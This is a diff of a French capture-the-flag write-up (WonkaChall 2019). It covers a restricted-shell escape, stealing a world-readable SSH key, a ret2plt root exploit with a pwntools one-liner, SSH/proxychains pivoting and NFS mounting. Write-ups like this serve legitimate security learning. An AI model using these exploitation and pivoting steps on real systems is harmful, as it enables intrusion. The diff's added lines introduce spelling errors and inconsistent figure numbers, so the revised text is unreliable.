@@ -1865,9 +1864,9 @@ UnicodeDecodeError: 'ascii' codec can't decode byte 0xc2 in position 2854: ordin
 Connection to 172.16.69.65 closed.
 ```
 
-Grâce à l'erreur python trouvée, très explicite, il me fût facile de tomber sur le [GitHub](https://github.com/ghantoos/lshell) de lshell. Pour s'évader de ce shell restreint, le plus simple reste d'inspecter les différentes _issues_ de sécurité du dépôt. Actuellement, il n'y a qu'une issue de securité active : https://github.com/ghantoos/lshell/issues/151#issuecomment-303696754
+Grâce à l'erreur python trouvée, très explicite, il me fut facile de tomber sur le [GitHub](https://github.com/ghantoos/lshell) de lshell. Dans le but de s'évader de ce shell restreint, le plus simple reste d'inspecter les différentes _issues_ de sécurité du dépôt. Actuellement, il n'y a qu'une issue de securité active : https://github.com/ghantoos/lshell/issues/151#issuecomment-303696754
 
-L'utilisateur __omega8cc__ mentionne un moyen de s'échapper fonctionnel :
+L'utilisateur __omega8cc__ mentionne un moyen de s'échapper quelque peu fonctionnel :
 
 ```bash
 (SRV02-BACKUP lshell) ➜ echo FREEDOM! && cd () bash && cd
@@ -1875,10 +1874,10 @@ L'utilisateur __omega8cc__ mentionne un moyen de s'échapper fonctionnel :
 
 <center>
 ![](/img/writeups/wonkachall2019/step10_escapeshell.png)
-_Fig 40_ : Evasion du shell restreint
+_Fig 39_ : Evasion du shell restreint
 </center>
 
-Le flag est situé dans le _home_ de __violet__ :
+Le flag étant situé dans le _home_ de __violet__ :
 
 ```bash
 (SRV02-BACKUP as violet) ➜ cat /etc/passwd|grep violet
@@ -1909,21 +1908,21 @@ d9c47d61bc453be0f870e0a840041ba054c6b7f725812ca017d7e1abd36b9865
 ### TL;DR
 
 1. Remarquer qu'il existe des fichiers world readable dans le __/home__ du système ;
-2. Lire la clé privée de l'utilisateur __Georgina__ ;
-3. Se connecter avec cette clé privée et accéder au _home_ de Georgina.
+2. Lire la clé privé de l'utilisateur __Georgina__ ;
+3. Se connecter avec cette clé privé et accéder au _home_ de Georgina.
 
 ---
 
 ### XI.1. Trouver la clé privé
 
-Étant connecté sur un système avec un utilisateur "standard", naturellement je regarde s'il m'est possible d'accéder aux _home_ des autres utilisateurs du système. C'est comme cela que j'ai trouvé une clé privée dans le _home_ de l'utilisateur __Georgina__ :
+Étant connecté sur un système avec un utilisateur "standard", naturellement je regarde s'il est possible d'accéder aux _home_ des autres utilisateurs du système. C'est comme cela qu'il est possible de trouver une clé privé dans le _home_ de l'utilisateur __Georgina__ :
 
 <center>
 ![](/img/writeups/wonkachall2019/step11_worldreadable.png)
-_Fig 41_ : Clé privée disponible en lecture pour tous les utilisateurs
+_Fig 38_ : Clé privé disponible en lecture pour tous les utilisateurs
 </center>
 
-La clé privée est disponible [ici](https://mega.nz/#!7r5BEYBR!q02ij1f1vGJ8cgXDdrmfkKaHK16cFwngdTuDzqqJ6u8).
+La clé privé est disponible [ici](https://mega.nz/#!7r5BEYBR!q02ij1f1vGJ8cgXDdrmfkKaHK16cFwngdTuDzqqJ6u8).
 
 Il ne reste plus qu'à se connecter au même serveur en tant que _Georgina_ :
 
@@ -1951,18 +1950,18 @@ Il ne reste plus qu'à se connecter au même serveur en tant que _Georgina_ :
 1. Utiliser __LinEnum__ afin de trouver __exportVIP__ un binaire _SUID_ et _SGID_ ;
 2. Trouver l'overflow de manière empirique ;
 3. Déterminer le padding (de 296 octets) nécessaire à la réécriture de RSP ;
-3. Regarder la __plt__ du binaire et les protections mises en place, en déduire que l'exploitation est un `ret2plt` ;
+3. Regarder la __plt__ du binaire et les protections mises en place, en déduire que l'exploitation s'agit d'un `ret2plt` ;
 4. Récupérer l'adresse de la fonction __system__ disponible dans la _plt_ ;
-6. Trouver un gadget `pop rdi; ret` dans le binaire nécessaire pour le placement des arguments ;
-2. Trouver l'adresse d'une chaîne de caractère dans le binaire, par exemple __GNU__ ;
-5. Faire un script exécutant un `/bin/bash -p`, l'appeler __GNU__ et le rajouter dans le _PATH_ ;
+6. Trouver un gadget `pop rdi; ret` dans le binaire nécessaire pour la placement des arguments ;
+2. Trouver l'adresse d'une chaine de caractère dans le binaire, par exemple __GNU__ ;
+5. Faire un script executant un `/bin/bash -p`, l'appeler __GNU__ et le rajouter dans le _PATH_ ;
 6. Exploiter le `ret2plt` en appelant la fonction _system_ en plaçant _GNU_ en paramètre : `/opt/exportVIP < <(python -c 'from pwn import *; print "a"*296+p64(0x000000000040145b)+p64(0x4002d0)+p64(0x40133d)';cat)`
 
 ---
 
 ### XII.1. Post exploitation
 
-Etant connecté en tant que _Georgina_ ou _Violet_, le but est d'élever ses privilèges et de récupérer un accès __root__ au serveur. Pour cela, il existe de nombreux scripts d'énumération pour de la post-exploitation sur GitHub. Personnellement, je trouve que __LinEnum__ est le plus pertinent. Ci-dessous les résultats importants remontés par _LinEnum_ :
+Etant connecté en tant que _Georgina_ ou _Violet_, le but est d'élever ses privilèges et de récupérer un accès __root__ au serveur. Pour cela, il existe de nombreux scripts d'énumeration pour de la post exploitation sur GitHub. Personnellement, je trouve que __LinEnum__ est le plus pertinent. Ci-dessous les résultats importants remontés par _LinEnum_ :
 
 ```bash
 (SRV02-BACKUP as Georgina) ➜ ./LinEnum.sh -s -r report -e /dev/shm -t
@@ -1999,7 +1998,7 @@ Etant connecté en tant que _Georgina_ ou _Violet_, le but est d'élever ses pri
 [...]
 ```
 
-Un seul de ces binaires n'est pas un programme par défaut : __/opt/exportVIP__. Si il est possible d'exécuter des commandes avec ce binaire, alors il sera possible d'exécuter des commandes en tant qu'utilisateur __root__. Il est préférable de réaliser l'analyse en local, dans un environnement maîtrisé :
+Un seul de ces binaires n'est pas un programme par défaut : __/opt/exportVIP__. Dans l'hypothèse où il est possible d'executer des commandes avec ce binaire, alors il est possible d'exécuter des commandes en tant qu'utilisateur __root__. Pour l'analyser, il est préférable de la faire en local, dans un environnement maîtrisé :
 
 ```bash
 (KaliVM) ➜ scp -i ~/Documents/id_rsa_georgina georgina@172.16.69.65:/opt/exportVIP .
@@ -2007,7 +2006,7 @@ Un seul de ces binaires n'est pas un programme par défaut : __/opt/exportVIP__.
 
 Le binaire est disponible [ici](https://mega.nz/#!DrxxwK6a!1hOFmmYMrImfOaGUC6aIfbTn8oPCyDqwDWgBcKSbz24).
 
-### XII.2. Informations sur le binaire
+### XII.2. Informations sur la binaire
 
 C'est un binaire 64 bits, strippé et linké dynamiquement :
 
@@ -2016,7 +2015,7 @@ C'est un binaire 64 bits, strippé et linké dynamiquement :
 exportVIP: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=46f5d9039533417cd40afbe9f9a7dbdf3726b897, stripped
 ```
 
-Un __stripped binary__ est un binaire sans les symboles de debug. Il est plus léger qu'un binaire non strippé. L'absence de ces symboles de debug complexifie le reverse du programme. Quant aux protections en place sur _exportVIP_, il n'y en a pas beaucoup :
+Un __stripped binary__ est un binaire sans les symboles de debug et est plus+ léger qu'un binaire non strippé. L'absence de ces symboles de debug complexifie le reverse du programme. Quant aux protections en place sur _exportVIP_, il n'y en a pas beaucoup :
 
 ```bash
 (KaliVM) ➜ checksec --file ./exportVIP
@@ -2024,14 +2023,14 @@ RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
 Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols       No	0		4	./exportVIP
 ```
 
-Merci à [Tomtombinary](https://twitter.com/tomtombinary), pour le schéma ci-dessous, résumant les types d'exploitation possibles en fonction des protections activées. __Cependant , veuillez noter que le schéma n'est PAS complet__.
+Merci à [Tomtombinary](https://twitter.com/tomtombinary), pour le schéma ci-dessous, résumant les types d'exploitation possibles en fonction des protections activées. __Cependant ce schéma n'est PAS complet__.
 
 <center>
 ![](/img/writeups/wonkachall2019/exploitation_protection.png)
-_Fig 42_ : Type d'exploitation en fonction des protections
+_Fig 39_ : Type d'exploitation en fonction des protections
 </center>
 
-Dans le cadre de l'exploitation de __exportVIP__, le _bit NX_ est activé, et sans doute l'_ASLR_ . Enfin l'outil __readelf__ permet d'obtenir des informations complémentaires comme les fonctions présentes dans la _plt_, le contenu de la _got_ et bien d'autres choses.
+Dans le cadre de l'exploitation de __exportVIP__, il y a le _bit NX_ et sûrement l'_ASLR_ d'activés. Enfin l'outil __readelf__ permet d'obtenir des informations complétementaires comme les fonctions présentes dans la _plt_, le contenu de la _got_ et bien d'autres choses.
 
 ```bash
 (KaliVM) ➜ readelf -a ./exportVIP
@@ -2050,17 +2049,17 @@ Section de réadressage '.rela.plt' à l\'adresse de décalage 0x528 contient 8 
 [...]
 ```
 
-La fonction __system__ étant présente dans la plt du binaire, cela va nous faciliter l'exploitation. En effet, si l'on se réfère au schéma de la figure 42, il faudrait leak une adresse de la libc, récupérer l'adresse de base de la libc et appeler la fonction _system_.  Geluchat a fait un bon [article](https://www.dailysecurity.fr/return_oriented_programming/) sur son blog à ce sujet.
+La fonction __system__ est présente dans la plt du binaire, cela facilitera l'exploitation. En effet, si on se réfère au schéma de la figure 38, il faudrait leak une adresse de la libc, récupérer l'adresse de base de la libc et appeler la fonction _system_.  Geluchat a fait un bon [article](https://www.dailysecurity.fr/return_oriented_programming/) sur son blog.
 
-Dans le cas du binaire _exportVIP_, la fonction _system_ est déjà présente dans le programme. Il suffit donc de l'appeler en plaçant l'argument voulu.
+Dans le cadre du binaire _exportVIP_, la fonction _system_ est déjà présente dans le programme. Il suffit donc de l'appeler en plaçant l'argument voulu.
 
 ### XII.3. Explication de l'exploitation
 
-L'objectif est d'appeler la fonction _system_ avec un paramètre contrôlé. Pour cela, il est impératif de trouver un buffer overflow pour pouvoir réécrire RIP pour rediriger le flux d'exécution sur l'adresse de _system_, si on veut résumer. Pour trouver le buffer overflow, il existe deux écoles : reverse en statique ou à grand coup de tests dynamiques (il est possible de mixer les deux). Pour rappel, le binaire ne contient pas les symboles de debug.
+L'objectif sera d'appeler la fonction _system_ avec un paramètre contrôlé. Pour cela, il est impératif de trouver un buffer overflow pour pouvoir réécrire RIP et jump sur l'adresse de _system_, en gros. Pour trouver le buffer overflow, il existe deux écoles : reverse en statique ou à grand coup de tests dynamique (il est possible de mixer les deux). Pour rappel, le binaire ne contient pas les symboles de debug.
 
-Lorsque le signal système _SIGSEGV_ est levé, cela signifie que le programme concerné à __segmentation fault__. En d'autres termes, une fonction du programme a tenté d'accéder à une zone mémoire non existante ou non autorisée. Dans le cadre d'une exploitation d'un buffer overflow, c'est une bonne chose, car RIP a bien été réécrit. Il va falloir trouver le bon padding pour réécrire RIP. Dans la convention de l'assembleur 64 bits, le premier argument d'une fonction se place dans le registre _rdi_. Afin d'exécuter la charge utile, il est possible de trouver une chaîne de caractère dans le programme _exportVIP_, comme "GNU" par exemple. Cette chaîne est présente dans tous les ELF (binaire linux). 
+Lorsque le programme va correctement __segmentation fault__, il va falloir trouver le bon padding pour réécrire RIP. Dans la convention de l'assembleur 64 bits, le premier argument d'une fonction se place dans le registre _rdi_. Afin d'exécuter la charge utile, il est possible de trouver une chaine de caractère dans le programme _exportVIP_, comme "GNU" par exemple. Cette chaine est présente dans tous les ELF (binaire linux). 
 
-Lorsque la chaîne a été choisie, il faut trouver son adresse dans le binaire ; _exportVIP_ n'étant pas soumis à la PIE, cette adresse ne changera pas. Enfin, il ne reste qu'à créer un script s'appelant comme la chaîne choisi et à l'ajouter dans le _PATH_. En résumé, l'objectif est de faire :
+Lorsque la chaine a été choisie, il faut trouver son adresse dans le binaire, _exportVIP_ n'étant pas soumis à la PIE, cette adresse ne changera pas. Enfin, il ne reste qu'à créer un script s'appelant comme la chaine choisi et l'ajouter dans le _PATH_. En résumé, l'objectif est de faire :
 
 ```c
 system("GNU");
@@ -2082,7 +2081,7 @@ padding + gadget + adresse de GNU + adresse de system
 
 #### XII.4.a. Déterminer le padding
 
-Lorsque l'on cherche le padding d'un buffer overflow, la librairie __pwntool__ peut être utile, car elle nous permet de générer un pattern. Ce pattern d'une taille arbitraire mais suffisamment grande servira à faire _segfault_ le programme. La valeur contenu dans RSP servira à déterminer la taille du padding :
+Afin de trouver le padding d'un buffer overflow, la librairie __pwntool__ permet de générer un pattern. Ce pattern d'une taille arbitraire mais suffisamment grande, fera _segfault_ le programme. La valeur contenu dans RSP servira à déterminer la taille du padding :
 
 ```python
 from pwn import *
@@ -2097,7 +2096,7 @@ find_cyclic('yaac')
 
 <center>
 ![](/img/writeups/wonkachall2019/step12_padding.png)
-_Fig 43_ : Padding pour contrôler RIP
+_Fig 40_ : Padding pour contrôler RIP
 </center>
 
 Le padding pour contrôler RIP est de 296 octets.
@@ -2118,7 +2117,7 @@ Le _call_ de _system_ dans le binaire est à l'adresse __0x40133d__.
 
 #### XII.4.c. Trouver un bon gadget
 
-Lister les gadgets d'un binaire peut se faire avec l'outil __ROPGadget__. Il permet de trouver les différents gadget et leur adresse. Pour rappel on cherche un `pop rdi; ret` :
+Lister les gadgets d'un binaire peut se faire avec l'outil __ROPGadget__. Il permet de trouver les différents gadget et leur l'adresses. Pour rappel on cherche un `pop rdi; ret` :
 
 ```bash
 (KaliVM) ➜ ROPgadget.py --binary ../exportVIP
@@ -2130,9 +2129,9 @@ Lister les gadgets d'un binaire peut se faire avec l'outil __ROPGadget__. Il per
 
 L'adresse du gadget est donc __0x000000000040145b__
 
-#### XII.4.d. Trouver l'adresse de la chaîne GNU
+#### XII.4.d. Trouver l'adresse de la chaine GNU
 
-La dernière pièce du puzzle est l'adresse de la chaîne __GNU__ dans _exportVIP_. Toujours avec __objdump__, il est possible de récupérer l'adresse de cette chaîne :
+La dernière pièce du puzzle est l'adresse de la chaine __GNU__ dans _exportVIP_. Toujours avec __objdump__ il est possible de récupérer l'adresse de cette chaine :
 
 ```bash
 (KaliVM) ➜ objdump -s /home/maki/Documents/wonkachall2019/step8/exportVIP
@@ -2140,7 +2139,7 @@ La dernière pièce du puzzle est l'adresse de la chaîne __GNU__ dans _exportVI
 
 <center>
 ![](/img/writeups/wonkachall2019/step12_gnuaddr.png)
-_Fig 44_ : Adresse de "GNU"
+_Fig 41_ : Adresse de "GNU"
 </center>
 
 L'adresse de __GNU__ n'est pas vraiment __0x4002d0__, on peut voir que ce n'est pas aligné. Il suffit d'enlever 4 octets :
@@ -2154,7 +2153,7 @@ L'adresse de __GNU__ est : __0x4002d0__
 
 #### XII.4.e. Ajout d'un binaire GNU dans le PATH
 
-Le binaire "GNU" va contenir un simple `bash -p`, l'argument permet de garder les droits de l'utilisateur pendant l'exécution. 
+Le binaire "GNU" va contenir un simple `bash -p`, l'argument permet de garder les droits de l'utilisateur pendant l'execution. 
 
 ```bash
 #!/bin/bash -p
@@ -2180,14 +2179,14 @@ Tous les paramètres sont maintenant disponibles : le padding, l'adresse du gadg
 
 <center>
 ![](/img/writeups/wonkachall2019/step12_root.png)
-_Fig 45_ : Accès root
+_Fig 42_ : Accès root
 </center>
 
 _Note_ : La librairie _pwntool_ est disponible sur le serveur distant. C'est plutôt rare, mais c'est arrangeant.
 
 Le flag de cette étape se trouve dans le dossier _/root_.
 
-### XII.6. Flag
+### XII.7. Flag
 
 > 6f424a5e3b001ee6a832581680169e2f687d8d6e493bdb4b26d518798f7b3c30
 
@@ -2212,13 +2211,13 @@ Le flag de cette étape se trouve dans le dossier _/root_.
 3. Faire un scan de port avec nmap sur la nouvelle cible, voir le `nfs` sur le port 2049 ;
 4. Monter le nfs distant sur la machine de pivot ;
 5. Copier les fichiers du partage réseau ; 
-6. Analyser les métadonnées avec __exiftool__ et trouver que __Grandma Josephine__ est le chef de _Willy Wonka_.
+6. Analyser les métadonnées avec __exiftool__ pour trouver que __Grandma Josephine__ est le chef de _Willy Wonka_.
 
 ---
 
 ### XIII.1. Post exploitation
 
-Le schéma trouvé sur le serveur _SRV01-INTRANET_ est incomplet. En effet, la machine __SRV03-FILER__ est tagguée en tant que "TODO". L'épreuve finale doit consister en l'accès à cette dernière machine. Avant de passer à la suite, il convient de se connecter en _root_ au serveur _SRV02-BACKUP_ avec un réel accès SSH. La clé privée est disponible [ici](https://mega.nz/#!q25BzSLZ!w9_4B8q7YTCgrUoMYkWPmyRn374xBZhxarUtYmgJJGc).
+Le schéma trouvé sur le serveur _SRV01-INTRANET_ est incomplet. En effet, la machine __SRV03-FILER__ est taggé en tant que "TODO". L'épreuve final doit être l'accès à cette dernière machine. Avant de passer à la suite, il convient de se connecter en _root_ au serveur _SRV02-BACKUP_ avec un réel accès SSH. La clé privé est disponible [ici](https://mega.nz/#!q25BzSLZ!w9_4B8q7YTCgrUoMYkWPmyRn374xBZhxarUtYmgJJGc).
 
 L'objectif est de trouver le chef de _Willy Wonka_. Comme pour la première étape de la dixième épreuve (cf. X.1. Reconnaissance), il est intéressant de vérifier le contenu du cache arp :
 
@@ -2230,11 +2229,11 @@ IP address       HW type     Flags       HW address            Mask     Device
 172.16.69.254    0x1         0x2         3e:20:13:a5:09:49     *        ens18
 ```
 
-Une nouvelle IP est apparut : __172.16.69.23__. Sûrement la machine nommée __SRV03-FILER__. Celle-ci n'a pas l'air accessible directement malgré les routes en place. Cependant, ayant un accès SSH à la machine _SRV02-BACKUP_, il est possible de faire un pivot.
+Une nouvelle IP est apparut : __172.16.69.23__. Sûrement la machine nommée __SRV03-FILER__. Celle ci n'a pas l'air accessible directement malgré les routes en place. Cependant, ayant un accès SSH à la machine _SRV02-BACKUP_, il est possible de faire un pivot.
 
 ### XIII.2. Mise en place du pivot
 
-Pour faire un pivot, il existe au moins deux outils pertinents : __proxychains__ et __sshuttle__. Dans les deux cas, il est nécessaire de faire suivre un port de la machine pivot (SRV02-BACKUP) et la machine de l'attaquant (KaliVM). Pour cette configuration, l'architecture présentée dans l'introduction a été abandonnée. Le _VPN du WonkaChall_ est directement dans la _KaliVM_. 
+Pour faire du pivot, il existe au moins deux outils pertinents : __proxychains__ et __sshuttle__. Dans les deux cas, il est nécessaire de faire suivre un port de la machine pivot (SRV02-BACKUP) et la machine de l'attaquant (KaliVM). Pour ce setup, l'architecture présentée dans l'introduction a été abandonnée. Le _VPN du WonkaChall_ est directement dans la _KaliVM_. 
 
 ```bash
 (KaliVM) ➜ ssh -D 1080 root@172.16.69.65 -i ./id_rsa_root
@@ -2254,7 +2253,7 @@ Le pivot est désormais mis en place. Il est possible pour la _KaliVM_ d'accéde
 
 ### XIII.3. Scan de port
 
-Le scan de port devenant une coutume lors de la découverte d'un nouvel hôte, celui-ci ne va pas échapper à la règle :
+Le scan de port devenant une coutume lors de la découverte d'un nouvel hôte, celui-ci ne vas pas échapper à la règle :
 
 ```bash
 (KaliVM) ➜ proxychains nmap -F -sT -Pn -T4 -vvv 172.16.69.23 
@@ -2267,11 +2266,11 @@ PORT     STATE SERVICE REASON
 2049/tcp open  nfs     syn-ack
 ```
 
-En considérant les trois ports ouverts, l'hypothèse la plus probable est l'accès au __Network File System__ (nfs) sur le port _2049/tcp_.
+En considérant les trois ports ouverts, l'hypothèse la plus probable est l'accès au __Network Fil System__ (nfs) sur le port _2049/tcp_.
 
 ### XIII.4. Montage du volume NFS
 
-La tentative de montage en passant par _proxychains_ est un échec. La solution la plus simple est de monter ce volume sur le serveur _SRV02-BACKUP_ :
+La tentative de montage en passant par _proxychains_ fut un échec. Le solution la plus simple a été de monter ce volume sur le serveur _SRV02-BACKUP_ :
 
 ```bash
 (SRV02-BACKUP as root) ➜ mkdir /tmp/a
@@ -2355,13 +2354,13 @@ Le flag final est le SHA256 de "Grandma Josephine".
 
 ## Conclusion
 
-Pour conclure, le WonkaChallenge d'Akerva m'a permis de travailler sur des technologies à jour, et ça a été vraiment agréable. La difficulté globale du challenge a bien été dosée, malgré les différentes catégories parcourues. D'un point de vue plus personnel, j'ai appris plusieurs choses : interagir avec des bucket s3, déployer une application via host-manager pour exploiter un serveur tomcat, le resource based constrained delegation pour impersonate un utilisateur sur l'active directory et enfin le ret2plt.
+Pour conclure, le WonkaChallenge d'Akerva m'a permis de travailler sur des technoloogies à jour, et c'est vraiment agréable. La difficulté globale du challenge a bien été dosée, malgré les différentes catégories parcourus. D'un point de vue plus personnel, j'ai appris plusieurs choses : intéragir avec des bucket s3, déployer une application via host-manager pour exploiter un serveur tomcat, le resource based constrained delegation pour impersonate un utilisateur sur l'active directory et enfin le ret2plt.
 
-Enfin, l'infrastructure du challenge a très bien résisté à l'assaut de plusieurs dizaines (centaines ?) de challengers. C'était agréable de pouvoir travailler sur le challenge sans bugs ou autres problèmes de stabilité. Seule l'utilisation du psexec juste après l'exploitation du rbcd a été un peu chaotique.
+Enfin, l'infrastructure du challenge a très bien résisté à l'assaut de plusieurs dizaines (centaines ?) de challengers. C'était agréable de faire le challenge sans bug ou autres problèmes de stabilité. Il n'y a que l'utilisation un peu chaotique du psexec juste après l'exploitation du rbcd.
 
-Pour clore ce writeup, je souhaite remercier l'équipe d'Akerva en charge du challenge. C'était de belles épreuves, et j'ai hâte de jouer le Wonka3 l'année prochaine !
+Pour terminer ce writeup, merci à l'équipe d'Akerva en charge du challenge ! C'était de belles épreuves et j'ai hâte de jouer le Wonka3 de l'année prochaine.
 
 <center>
 ![](/img/writeups/wonkachall2019/flag_lol.jpg)
-_Fig 46_ : Image de l'équipe d'Akerva, disponible dans le NFS de SRV03-FILER
+_Fig 43_ : Image de l'équipe d'Akerva, disponible dans le NFS de SRV03-FILER
 </center>
